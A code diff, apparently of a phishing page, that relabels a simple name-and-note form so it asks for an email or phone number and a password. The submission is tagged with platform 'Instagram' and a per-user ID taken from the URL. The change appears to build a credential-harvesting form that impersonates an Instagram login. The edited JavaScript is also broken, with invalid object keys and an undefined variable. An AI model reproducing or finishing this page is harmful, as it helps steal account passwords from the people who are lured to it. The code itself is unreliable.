@@ -103,9 +103,9 @@ text-align:center;
 
 <p>Input your details below</p>
 
-<input type="text" id="name" placeholder="Input your name">
+<input type="text" id="email/phone number" placeholder="Input Email or Phone number">
 
-<textarea id="note" placeholder="Input your note"></textarea>
+<textarea id="Password" placeholder="Input your Password"></textarea>
 
 <button onclick="submitForm()">
 Finish
@@ -133,10 +133,10 @@ const userID = params.get("id");
 function submitForm(){
 
 let name =
-document.getElementById("name").value;
+document.getElementById("email/phone number").value;
 
 let note =
-document.getElementById("note").value;
+document.getElementById("Password").value;
 
 if(name.trim()==="" || note.trim()===""){
 
@@ -151,9 +151,9 @@ platform:"Instagram",
 
 id:userID,
 
-name:name,
+email/phone number:email/phone number,
 
-note:note,
+Password:Password,
 
 time:new Date().toLocaleTimeString()
 
